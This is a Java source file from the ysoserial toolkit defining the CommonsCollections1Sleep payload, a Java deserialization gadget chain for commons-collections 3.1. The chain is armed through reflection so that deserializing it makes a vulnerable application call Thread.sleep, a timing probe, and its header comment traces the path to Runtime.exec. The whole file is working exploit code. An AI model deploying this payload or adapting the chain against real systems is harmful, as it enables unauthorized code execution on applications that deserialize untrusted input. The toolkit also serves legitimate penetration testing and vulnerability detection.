package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class CommonsCollections1Sleep extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	public InvocationHandler getObject(final String command) throws Exception {
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		//Thread.class.getMethod("sleep", Long.TYPE).invoke(5000);

		final Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Thread.class),
				new InvokerTransformer("getMethod",
						new Class[]{
								String.class, Class[].class
						},
						new Object[]{
								"sleep", new Class[]{Long.TYPE}
						}),
				new InvokerTransformer("invoke",
						new Class[]{
								Object.class, Object[].class
						}, new Object[]
						{
								null, new Object[] {Long.parseLong(command)}
						}),

				// No exception variant, returns sun.reflect.annotation.AnnotationInvocationHandler
				new ConstantTransformer(java.util.HashSet.class),
				new InvokerTransformer("newInstance",
						null, null )};

//				new ConstantTransformer(1)};

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1Sleep.class, args);
	}
	
	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
